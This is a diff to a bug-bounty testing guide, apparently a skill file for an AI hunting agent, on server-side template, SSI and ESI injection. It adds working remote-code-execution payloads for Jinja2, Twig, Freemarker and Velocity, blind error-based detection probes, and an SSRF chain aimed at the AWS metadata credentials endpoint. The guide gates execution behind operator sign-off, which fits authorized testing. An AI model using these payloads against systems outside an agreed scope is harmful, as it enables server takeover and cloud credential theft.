@@ -39,14 +39,16 @@ it is an unauthorized intrusion.
    field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
    ```
    JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).
-3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
+3. **If Jinja2 fails**, try Twig (PHP/Symfony), picking the payload by major version:
+   - **Twig 1.x only:** `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`. Twig 2.0 changed `_self` to return the template name string, so this is dead on 2.x/3.x.
+   - **Twig >= 2.10 / 3.x:** `{{['id']|filter('system')}}` or `{{['id']|map('system')|join}}` (a string callable handed to an arrow-function filter). Blocked in sandbox mode since 2.13.1 / 3.0.5, deprecated outside the sandbox since 3.15.0 (still executes on 3.x), rejected in Twig 4 (Closure-only).
 4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.
 
 **Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts — the format is irrelevant, the content is the evidence.
 
 ---
 
-## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION
+## SSTI — SERVER-SIDE TEMPLATE INJECTION
 > Easy to detect, high payout ($2K–$8K). Direct path to RCE.
 
 ### Detection Payloads (try all)
@@ -56,7 +58,19 @@ ${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
 <%= 7*7 %>       → 49 = ERB (Ruby)
 *{7*7}           → 49 = Spring Thymeleaf
 {{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
+                   Nunjucks (Node) also gives 49 (JS coercion); Pebble / Jinjava (Java) also render {{7*7}} → 49.
+{{'a'.toUpperCase()}} → A = Jinjava / Pebble (Java method call) or Nunjucks (JS); Jinja2 and Twig raise an error
+{{this}}         → [object Object] = Handlebars (logic-less: {{7*7}} is a parse error there, never 49)
+#{7*7}           → 49 with ${7*7} left literal = Pug (Node interpolation)
+<%= 7*'7' %>     → 49 = EJS (Node, JS coercion); ERB raises TypeError (String can't be coerced into Integer)
 ```
+When two engines share a probe result, the error text settles it: stack traces naming `pebble`, `jinjava`, `nunjucks`, `handlebars`, `pug` or `ejs` identify the engine outright.
+
+### Error-based and boolean-error blind SSTI ("Successful Errors")
+When arithmetic never renders (output not reflected, or reflected somewhere you cannot see), use the engine's **errors** as the oracle. Source: Vladislav Korchagin, *Successful Errors: New Code Injection and SSTI Techniques* (<https://github.com/vladko312/Research_Successful_Errors>), ranked #1 in PortSwigger's Top 10 web hacking techniques of 2025 (<https://portswigger.net/research/top-10-web-hacking-techniques-of-2025>). Covers Python, PHP, Java, Ruby, NodeJS and Elixir (Jinja2, Twig, Freemarker, Velocity, SpEL, OGNL, Dust.js, EEx among them).
+- **Error-based:** make the engine throw an error whose message embeds the evaluated value (the SSTI analogue of SQLi `CONVERT(INT, ...)`). Needs verbose errors in the response.
+- **Boolean error-based blind:** with generic errors, raise an error on only one branch and diff the response (status, length, timing, headers) against a baseline. Send equal-length pairs, one valid and one broken: `(3*4/2)` vs `3*)2(/4`, `((7*8)/(2*4))` vs `7)(*)8)(2/(*4`. Plain reflection treats both alike; an evaluating engine renders one and errors on the other. A generic error trigger is `(1/0).zxy.zxy`. Repeat each pair before trusting the differential.
+- **Tool:** SSTImap (<https://github.com/vladko312/SSTImap>), current release v1.4 (2026-08-25). v1.3 (2025-08-19) added the error-based and boolean error-based blind techniques, a Spring EL plugin, Freemarker expression evaluation and a `|map()`-based Twig payload; v1.4 added a detect-only Mustache plugin (GHSA-5hrj-7fc3-cmx9) and Pybars. Use it for detection; its exploitation modes are Stage B like any other command execution.
 
 ### RCE Payloads
 
@@ -67,7 +81,11 @@ ${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
 
 **Twig (PHP/Symfony):**
 ```php
+{# Twig 1.x only: from Twig 2.0 on, _self is the template name string #}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{# Twig >= 2.10 / 3.x: string callable into an arrow-function filter (fails in sandbox mode and on Twig 4) #}
+{{['id']|filter('system')}}
+{{['id']|map('system')|join}}
 ```
 
 **ERB (Ruby):**
@@ -99,7 +117,9 @@ preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three 
    whole matrix and read which one evaluates:
    ```
    ${7*7}  → 49  AND  #{7*7} → 49   ⇒ Freemarker (Java)   ← {{7*7}} does NOTHING here
-   {{7*7}} → 49                      ⇒ Jinja2 / Twig
+   {{7*7}} → 49                      ⇒ Jinja2 / Twig (also Nunjucks, Pebble, Jinjava)
+   {{this}} → [object Object]        ⇒ Handlebars (Node)
+   #{7*7} → 49, ${7*7} literal       ⇒ Pug (Node)
    <%= 7*7 %> → 49                   ⇒ ERB (Ruby)
    *{7*7}  → 49                      ⇒ Thymeleaf (Spring)
    ```
@@ -124,7 +144,7 @@ preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three 
 
 ---
 
-## 15. SSI — SERVER-SIDE INCLUDES INJECTION
+## SSI — SERVER-SIDE INCLUDES INJECTION
 
 > **The engine-identification priority at the top of this skill applies here too, and the Stage B gate applies doubly.** SSI/ESI run at the web server or CDN edge, not in an application template engine, so a directive that executes hits shared infrastructure rather than one application. Command execution exists on **Apache only** and only when `Options Includes` (not `IncludesNOEXEC`) is set; **nginx SSI has no command-exec directive at all** (verified against the nginx `ngx_http_ssi_module` docs). Detect first; gate anything that reads a file, fetches a URL, or runs a command behind explicit operator sign-off.
 
@@ -146,7 +166,7 @@ A literal echo of the directive back = not parsed = no finding.
 
 **Stage B — execute (requires explicit scope sign-off).** `#include virtual="/internal/..."` performs an internal request (SSRF-shaped — inherit the `hunt-ssrf` gate before firing one at a non-public path); `#include file=` reads a server file; `#exec cmd=` is Apache-only RCE. Confirm with a unique benign canary echoed back and a body-diff against the pre-injection baseline before claiming impact. Do not run a command that writes, deletes, or opens a network connection off-box.
 
-## 16. ESI — EDGE-SIDE INCLUDES INJECTION
+## ESI — EDGE-SIDE INCLUDES INJECTION
 
 ESI are cache-edge directives: a CDN or caching proxy resolves `<esi:...>` tags before serving. If an attacker injects an ESI tag into content the edge then parses, the edge renders attacker markup — **and because the response is cached, it is served to every visitor.** The supported-directive set is the whole finding: it varies sharply by vendor, so a payload that works on one edge is inert on another.
 
@@ -174,6 +194,6 @@ Always add a unique cache-buster query param to every probe so it lands on a cac
 - **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
 - **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
 - **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
-- **`hunt-cache-poison`** — ESI injection (§16) lives at the CDN/cache edge, so an interpreted `<esi:...>` tag in a cacheable response is stored and served to every visitor. Chain primitive: inject an ESI tag reflected into a cached page → edge renders attacker markup for all clients hitting that edge = cache poisoning at ESI level. Always cache-bust detection probes; cross-reference that skill's unkeyed-input and blast-radius discipline.
-- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
+- **`hunt-cache-poison`** — ESI injection (see the ESI section above) lives at the CDN/cache edge, so an interpreted `<esi:...>` tag in a cacheable response is stored and served to every visitor. Chain primitive: inject an ESI tag reflected into a cached page → edge renders attacker markup for all clients hitting that edge = cache poisoning at ESI level. Always cache-bust detection probes; cross-reference that skill's unkeyed-input and blast-radius discipline.
+- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback (1.x only) or `|filter('system')` (2.10+/3.x), Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
 - **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.
